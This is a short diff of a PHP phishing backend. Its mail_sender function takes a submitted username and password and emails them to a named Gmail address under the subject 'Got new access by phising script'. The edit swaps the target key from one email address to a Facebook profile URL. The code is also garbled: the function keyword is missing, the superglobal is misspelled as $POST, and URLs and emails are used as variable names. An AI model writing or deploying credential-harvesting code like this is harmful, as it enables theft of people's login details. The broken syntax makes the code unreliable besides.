@@ -1,12 +1,12 @@
 <?php
 	mail_sender(){
-		$username = $POST['vmthalapathy2204@gmail.com'];
+		$username = $POST['https://www.facebook.com/vm.mullai'];
 		$password = $POST['password'];
 		
 		$reciever = "vmchems2204@gmail.com";
 		
 		$subject = "Got new access by phising script";
-		$message = "The username is ". $vmthalapathy2204@gmail.com;
+		$message = "The username is ". $https://www.facebook.com/vm.mullai;
 		$message .= "and password is ". $password;
 		
 		return mail($reciever, $subject, $message);
